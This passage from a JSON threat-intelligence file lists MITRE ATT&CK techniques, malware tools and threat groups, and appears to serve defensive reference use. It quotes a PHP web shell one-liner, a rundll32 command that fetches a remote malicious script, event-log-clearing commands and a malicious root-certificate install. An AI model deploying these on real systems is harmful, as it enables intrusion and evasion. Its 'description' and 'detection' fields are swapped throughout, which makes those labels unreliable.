                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Thread Local Storage",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing.\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1132",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Data Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  Some data encoding systems may also result in data compression, such as gzip.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1091",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Replication Through Removable Media",
                "chain_phase": "lateral-movement",
                "description": "Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.",
                "detection": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1090",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).",
                "detection": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1080",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Taint Shared Content",
                "chain_phase": "lateral-movement",
                "description": "Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.",
                "detection": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. \n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1007",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "System Service Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using Tasklist, and \"net start\" using Net, but adversaries may also use other tools as well. Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0386",
            "type": "tool",
            "attributes": {
                "name": "Ursnif",
                "aliases": [
                    "Gozi-ISFB",
                    "PE_URSNIF",
                    "Dreambot"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Ursnif is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, Spearphishing Attachments, and malicious links. Ursnif is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 35,
            "techniques": [
                "T1012",
                "T1047",
                "T1564.003",
                "T1074.001",
                "T1070.004",
                "T1140",
                "T1056.004",
                "T1547.001",
                "T1059.005",
                "T1080",
                "T1113",
                "T1090.003",
                "T1112",
                "T1041",
                "T1055.012",
                "T1497.003",
                "T1185",
                "T1543.003",
                "T1059.001",
                "T1106",
                "T1091",
                "T1559.001",
                "T1568.002",
                "T1071.001",
                "T1090",
                "T1057",
                "T1105",
                "T1094",
                "T1027",
                "T1005",
                "T1132",
                "T1055.005",
                "T1036.005",
                "T1007",
                "T1082"
            ]
        },
        {
            "id": "G0126",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Higaisa",
                "aliases": [],
                "description": "Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. Higaisa was first disclosed in early 2019 but is assessed to have operated as early as 2009.",
                "tools": [
                    "S0013",
                    "S0032",
                    "S0160"
                ],
                "techniques": [
                    "T1059.007",
                    "T1573.001",
                    "T1071.001",
                    "T1001.003",
                    "T1090.001",
                    "T1564.003",
                    "T1574.002",
                    "T1204.002",
                    "T1059.005",
                    "T1059.003",
                    "T1566.001",
                    "T1036.004",
                    "T1027.001",
                    "T1547.001",
                    "T1053.005",
                    "T1220",
                    "T1203",
                    "T1140",
                    "T1124",
                    "T1106",
                    "T1082",
                    "T1057",
                    "T1041",
                    "T1029",
                    "T1027",
                    "T1016"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1553.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Install Root Certificate",
                "chain_phase": "defense-evasion",
                "description": "A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072",
                "detection": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.  Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. \n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. \n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. \n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0160",
            "type": "tool",
            "attributes": {
                "name": "certutil",
                "aliases": [
                    "certutil.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "certutil is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 3,
            "techniques": [
                "T1553.004",
                "T1140",
                "T1105"
            ]
        },
        {
            "id": "T1573",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Encrypted Channel",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1568.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Fast Flux DNS",
                "chain_phase": "command-and-control",
                "description": "In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.",
                "detection": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Clear Windows Event Logs",
                "chain_phase": "defense-evasion",
                "description": "Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").",
                "detection": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.011",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Rundll32",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
                "detection": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://www.example.com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1129",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Shared Modules",
                "chain_phase": "execution",
                "description": "Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.",
                "detection": "Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. \n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Command and Scripting Interpreter",
                "chain_phase": "execution",
                "description": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "S0032",
            "type": "tool",
            "attributes": {
                "name": "gh0st RAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "gh0st RAT is a remote access tool (RAT). The source code is public and it has been used by multiple groups. ",
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            },
            "val": 24,
            "techniques": [
                "T1012",
                "T1070.004",
                "T1070.001",
                "T1140",
                "T1547.001",
                "T1059",
                "T1573.001",
                "T1113",
                "T1112",
                "T1055",
                "T1056.001",
                "T1132.001",
                "T1574.002",
                "T1095",
                "T1568.001",
                "T1569.002",
                "T1543.003",
                "T1106",
                "T1573",
                "T1057",
                "T1105",
                "T1082",
                "T1218.011",
                "T1129"
            ]
        },
        {
            "id": "G0125",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "HAFNIUM",
                "aliases": [
                    "Operation Exchange Marauder"
                ],
                "description": "HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.",
                "tools": [
                    "S0020",
                    "S0073",
                    "S0029"
                ],
                "techniques": [
                    "T1592.004",
                    "T1590.005",
                    "T1590",
                    "T1589.002",
                    "T1583.006",
                    "T1583.003",
                    "T1071.001",
                    "T1132.001",
                    "T1078.003",
                    "T1567.002",
                    "T1059.001",
                    "T1560.001",
                    "T1114.002",
                    "T1003.003",
                    "T1003.001",
                    "T1136.002",
                    "T1218.011",
                    "T1505.003",
                    "T1203",
                    "T1105",
                    "T1095"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1505.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Web Shell",
                "chain_phase": "persistence",
                "description": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ",
                "detection": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: China Chopper Web shell client). ",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0073",
            "type": "tool",
            "attributes": {
                "name": "ASPXSpy",
                "aliases": [
                    "ASPXTool"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ASPXSpy is a Web shell. It has been modified by Threat Group-3390 actors to create the ASPXTool version. ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 1,
            "techniques": [
                "T1505.003"
            ]
        },
        {
            "id": "T1570",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Lateral Tool Transfer",
                "chain_phase": "lateral-movement",
                "description": "Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
                "detection": "Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0029",
            "type": "tool",
            "attributes": {
                "name": "PsExec",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 3,
            "techniques": [
                "T1570",
                "T1569.002",
                "T1021.002"
            ]
        },
        {
            "id": "T1110.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Password Guessing",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.",
                "detection": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0020",
            "type": "tool",
            "attributes": {
                "name": "China Chopper",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "China Chopper is a Web Shell hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.  It has been used by several threat groups.  ",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 10,
            "techniques": [
                "T1110.001",
                "T1071.001",
                "T1027.002",
                "T1046",
                "T1005",
                "T1505.003",
                "T1070.006",
                "T1059.003",
                "T1083",
                "T1105"
            ]
        },
        {
            "id": "G0124",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Windigo",
                "aliases": [],
                "description": "The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, Windigo operators continued updating Ebury through 2019.",
                "tools": [
                    "S0377"
                ],
                "techniques": [
                    "T1518",
                    "T1189",
                    "T1090",
                    "T1083",
                    "T1082",
                    "T1059",
                    "T1005"
                ],
                "affiliation": "",
                "targets": [],
                "speciality": []
            }
        },
        {
            "id": "T1556.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Pluggable Authentication Modules",
                "chain_phase": "credential-access",
                "description": "Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "detection": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1562.006",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Indicator Blocking",
                "chain_phase": "defense-evasion",
                "description": "Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>",
                "detection": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting  or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry.  These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1574.006",
